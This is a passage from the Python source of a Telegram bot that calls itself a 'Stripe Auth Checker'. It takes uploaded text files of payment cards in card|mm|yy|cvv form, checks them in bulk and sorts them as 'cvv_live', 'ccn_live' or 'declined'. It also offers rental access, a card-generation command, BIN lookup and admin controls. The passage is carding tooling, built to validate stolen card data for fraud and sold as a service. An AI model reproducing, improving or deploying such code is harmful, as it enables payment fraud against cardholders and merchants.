        rentals_list.append(f"👤 {username} (ID: {rental_user_id}) - 📅 {days_left} days left")
    
    await safe_send_message(
        update,
        f"💳 <b>Active Rentals with Names</b>\n\n" + "\n".join(rentals_list)
    )

async def remove_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /removeuser command - admin only"""
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_ID:
        await safe_send_message(update, "❌ Admin only command!")
        return
        
    if not context.args:
        await safe_send_message(update, "❌ Usage: /removeuser [user_id]")
        return
        
    remove_user_id = context.args[0]
    if remove_user_id in AUTHORIZED_USERS:
        AUTHORIZED_USERS.remove(remove_user_id)
        await safe_send_message(update, f"✅ User {remove_user_id} removed!")
    else:
        await safe_send_message(update, "❌ User not found!")

async def remove_rental_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /removerental command - admin only"""
    user_id = str(update.effective_user.id)
    if user_id != ADMIN_ID:
        await safe_send_message(update, "❌ Admin only command!")
        return
        
    if not context.args:
        await safe_send_message(update, "❌ Usage: /removerental [user_id]")
        return
        
    remove_user_id = context.args[0]
    if remove_rental(remove_user_id):
        await safe_send_message(update, f"✅ Rental removed for user {remove_user_id}!")
    else:
        await safe_send_message(update, "❌ Rental not found!")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle file uploads"""
    if not await check_access(update):
        return
        
    chat_id = update.message.chat_id
    user_session = get_user_session(chat_id)
    
    if user_session["checking"]:
        await safe_send_message(update, "❌ Please stop current checking first using /stop")
        return
        
    document = update.message.document
    if document.file_name.endswith('.txt'):
        # Download the file
        file = await context.bot.get_file(document.file_id)
        file_path = f"cc_{chat_id}.txt"
        await file.download_to_drive(file_path)
        
        await safe_send_message(
            update,
            f"✅ File received: {document.file_name}\n"
            f"Use /start to begin checking\n"
            f"Max cards: {MAX_CARDS_LIMIT}"
        )
    else:
        await safe_send_message(update, "❌ Please upload a .txt file")

# FIXED: start_checking with better resource management and error handling
async def start_checking(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Optimized start checking that prevents system overload"""
    try:
        if not await check_access(update):
            return
            
        chat_id = update.message.chat_id
        user_session = get_user_session(chat_id)
        
        if user_session["checking"]:
            await safe_send_message(update, "❌ You already have a checking session in progress! Use /stop to stop first.")
            return
        
        # Check if system can handle more users
        if not can_accept_new_user():
            await safe_send_message(
                update,
                "🚫 <b>System Busy</b>\n\n"
                "Too many users are currently checking cards.\n"
                "Please try again in a few minutes.\n\n"
                f"Max concurrent users: {MAX_CONCURRENT_USERS}"
            )
            return
        
        user_file = f"cc_{chat_id}.txt"
        if not os.path.exists(user_file):
            await safe_send_message(
                update,
                "📁 <b>Send cc.txt file with cards to check.</b>\n\n"
                "Format:\n<code>card|mm|yy|cvv</code>\n\n"
                "DM @mcchiatoos for any problem"
            )
            return
        
        try:
            with open(user_file, 'r') as f:
                cards = [line.strip() for line in f if line.strip()]
        except Exception as e:
            logger.error(f"Error reading card file: {e}")
            await safe_send_message(update, "❌ Error reading your card file!")
            return
        
        if not cards:
            await safe_send_message(update, "❌ No cards found in your file!")
            return
        
        if len(cards) > MAX_CARDS_LIMIT:
            cards = cards[:MAX_CARDS_LIMIT]
            await safe_send_message(
                update,
                f"⚠️ <b>Maximum card limit applied!</b>\n\n"
                f"Only the first {MAX_CARDS_LIMIT} cards will be checked.\n"
                f"Your file contained {len(cards)} cards."
            )
        
        # Initialize session
        user_session.update({
            "checking": True,
            "cards": cards,
            "current_index": 0,
            "stats": {
                "cvv_live": 0,
                "ccn_live": 0,
                "declined": 0,
                "total": len(cards)
            },
            "start_time": time.time(),
            "message_id": None,
            "chat_id": chat_id,
            "current_card_info": None,
            "task_id": str(uuid.uuid4())[:8],
            "processor": None,
            "active": False
        })
        
        # Send initial message
        initial_counts = {
            'status': 'Starting...',
            'cvv_live': 0,
            'ccn_live': 0,
            'declined': 0,
            'total': len(cards),
            'current': 0
        }
        
        response = send_telegram_message_sync(
            "🔄 Processing...", 
            chat_id,
            reply_markup=build_keyboard(user_session["task_id"], initial_counts, None)
        )
        
        if response and response.status_code == 200:
            data = response.json()
            user_session["message_id"] = data['result']['message_id']
        
        # Start checking in background
        future = global_thread_pool.submit(checking_thread, user_session)
        
        with active_users_lock:
            active_count = active_users_count
        
        await safe_send_message(
            update,
            f"✅ Checking started! Processing {len(cards)} cards.\n"
            f"👥 Active users: {active_count + 1}/{MAX_CONCURRENT_USERS}\n"
            f"⚡ System optimized for multi-user performance\n"
            f"Use /stats to see progress."
        )
        
    except Exception as e:
        logger.error(f"Error in start_checking: {e}")
        await safe_send_message(update, "❌ An error occurred while starting the check.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Global error handler for the bot."""
    logger.error("Exception while handling an update:", exc_info=context.error)
    
    # Log the full error details
    error_msg = f"⚠️ <b>Bot Error</b>\n\n"
    
    if update and update.effective_message:
        error_msg += f"<b>Chat:</b> {update.effective_chat.id if update.effective_chat else 'N/A'}\n"
        error_msg += f"<b>User:</b> {update.effective_user.id if update.effective_user else 'N/A'}\n"
    
    error_msg += f"<b>Error:</b> {type(context.error).__name__}\n"
    error_msg += f"<b>Message:</b> {str(context.error)}\n"
    error_msg += f"<b>Time:</b> {datetime.now().strftime('%Y-%m-d %I:%M %p')}"
    
    # Send error log via the logging bot
    send_error_log_sync(error_msg)
    
    # Optional: Notify user about the error
    try:
        if update and update.effective_chat:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text="❌ An error occurred while processing your request. Please try again.",
                parse_mode='HTML'
            )
    except Exception as e:
        logger.error(f"Failed to send error message to user: {e}")

# FIXED: Main function with better exception handling and resource cleanup
def main():
    """Main function to run the bot with optimized multi-user performance"""
    logger.info("🤖 Multi-User Stripe Auth Checker Bot Starting...")
    logger.info(f"✅ Authorized users: {AUTHORIZED_USERS}")
    logger.info(f"📊 Maximum cards per check: {MAX_CARDS_LIMIT}")
    logger.info(f"⚙️ Global thread pool workers: {GLOBAL_MAX_WORKERS}")
    logger.info(f"👤 User thread pool workers: {USER_MAX_WORKERS}")
    logger.info(f"👥 Max concurrent users: {MAX_CONCURRENT_USERS}")
    logger.info(f"⏰ Request timeout: {REQUEST_TIMEOUT}s")
    logger.info(f"💡 System optimized for 5 users with approved cards results file")
    
    cleanup_expired_rentals()
    
    while True:
        try:
            application = Application.builder().token(BOT_TOKEN).build()
            
            application.add_error_handler(error_handler)
            
            # Add handlers
            application.add_handler(CommandHandler("start", start_checking))
            application.add_handler(CommandHandler("stop", stop_command))
            application.add_handler(CommandHandler("stats", stats_command))
            application.add_handler(CommandHandler("myaccess", myaccess_command))
            application.add_handler(CommandHandler("bin", bin_command))
            application.add_handler(CommandHandler("gen", gen_command))
            application.add_handler(CommandHandler("active", active_command))
            application.add_handler(CommandHandler("system", system_command))
            application.add_handler(CommandHandler("cmds", cmds_command))
            application.add_handler(CommandHandler("help", cmds_command))
            
            # Add admin commands
            application.add_handler(CommandHandler("adduser", add_user_command))
            application.add_handler(CommandHandler("addrental", add_rental_command))
            application.add_handler(CommandHandler("listusers", list_users_command))
            application.add_handler(CommandHandler("listrentals", list_rentals_command))
            application.add_handler(CommandHandler("listusers_with_names", list_users_with_names_command))
            application.add_handler(CommandHandler("listrentals_with_names", list_rentals_with_names_command))
            application.add_handler(CommandHandler("removeuser", remove_user_command))
            application.add_handler(CommandHandler("removerental", remove_rental_command))
            
            application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
            application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, start_command))
            
            application.add_handler(CallbackQueryHandler(handle_stop_callback, pattern=r'^stop_masschk_'))
            application.add_handler(CallbackQueryHandler(handle_noop_callback, pattern=r'^noop$'))
            
            logger.info("✅ Bot is running with 5 user limit and approved cards results file...")
            application.run_polling(
                drop_pending_updates=True,
                allowed_updates=Update.ALL_TYPES,
                poll_interval=1.0,
                timeout=30,  # Increased timeout
                read_timeout=30,
                write_timeout=30,
                connect_timeout=30
            )
            
        except Exception as e:
            logger.error(f"Bot crashed with error: {e}")
            logger.info("🔄 Restarting bot in 10 seconds...")
            time.sleep(10)

if __name__ == "__main__":
    main()